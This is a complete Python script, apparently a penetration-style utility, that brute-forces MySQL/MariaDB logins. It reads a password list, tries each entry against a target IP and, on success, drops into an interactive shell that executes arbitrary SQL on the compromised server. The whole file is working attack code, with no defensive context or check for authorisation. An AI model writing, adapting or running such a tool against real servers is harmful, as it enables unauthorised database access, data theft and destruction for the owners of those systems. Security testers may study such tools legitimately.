import argparse
import mysql.connector
from mysql.connector import Error
from colorama import Fore, init
import time

# Initialize colorama
init(autoreset=True)

def brute_force_sql(username, password_list, target_ip):
    # Try connecting to the MySQL/MariaDB server
    connection = None
    for password in password_list:
        try:
            print(Fore.YELLOW + f'Trying Passphrase: "{password}"')
            connection = mysql.connector.connect(
                host=target_ip,
                user=username,
                password=password
            )

            if connection.is_connected():
                print(Fore.GREEN + f'KEY FOUND: "{password}"')
                return connection
        except Error as err:
            if connection is not None:
                connection.close()

    print(Fore.RED + "KEY NOT FOUND")
    return None

def execute_commands(connection):
    cursor = connection.cursor()
    while True:
        try:
            sql_query = input(Fore.CYAN + 'SQL> ')
            if sql_query.lower() in ['exit', 'quit']:
                break

            cursor.execute(sql_query)
            if sql_query.lower().startswith("select"):
                result = cursor.fetchall()
                for row in result:
                    print(row)
            else:
                print(Fore.GREEN + "Query executed successfully.")
        except Error as err:
            print(Fore.RED + f"Error: {err}")

def main():
    parser = argparse.ArgumentParser(description="SQL Bruteforce Tool")
    parser.add_argument('-l', '--username', required=True, help="Username for SQL login")
    parser.add_argument('-P', '--passwordlist', required=True, help="Path to password list file")
    parser.add_argument('target', help="Target SQL server IP (sql://<target-ip>)")

    args = parser.parse_args()

    # Extract the target IP
    if not args.target.startswith("sql://"):
        print(Fore.RED + "Invalid target format. Use sql://<target-ip>")
        return

    target_ip = args.target.split("://")[1]
    password_list = []

    # Read password list from file
    try:
        with open(args.passwordlist, 'r') as file:
            password_list = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(Fore.RED + "Password list file not found.")
        return

    # Bruteforce connection
    connection = brute_force_sql(args.username, password_list, target_ip)

    if connection:
        print(Fore.GREEN + "Connected to the target database!")
        execute_commands(connection)
        connection.close()
    else:
        print(Fore.RED + "Failed to connect to the target database.")

if __name__ == "__main__":
    main()
